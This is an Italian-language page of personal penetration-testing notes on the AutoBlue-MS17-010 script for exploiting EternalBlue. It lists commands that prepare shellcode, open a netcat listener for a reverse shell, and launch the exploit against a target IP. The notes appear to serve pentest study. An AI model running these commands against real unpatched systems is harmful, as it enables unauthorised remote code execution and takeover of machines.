<a href="https://github.com/Gigidotexe/Penetration_Test_notes/blob/main/README.md"> Back </a>
# AutoBlue-MS17-010

**AutoBlue-MS17-010** è uno script Python, disponibile su <a href="https://github.com/3ndG4me/AutoBlue-MS17-010/tree/master">GutHub</a> che automatizza lo sfruttamento della vulnerabilità EternalBlue. <br>
È particolarmente utile in contesti dove non si usa Metasploit o si preferisce una procedura manuale e più trasparente.

```bash
cd AutoBlue-MS17-010/shellcode
chmod +x shell_prep.sh
./shell_prep.sh
nc -nvlp 4444
python eternalblue_exploit7.py <IP> shellcode/sc_x64.bin
```

AutoBlue può essere utilizzato per generare shellcode, avviare listener e inviare l’exploit, e funziona efficacemente su macchine non patchate vulnerabili a MS17-010 con SMBv1 attivo.

---
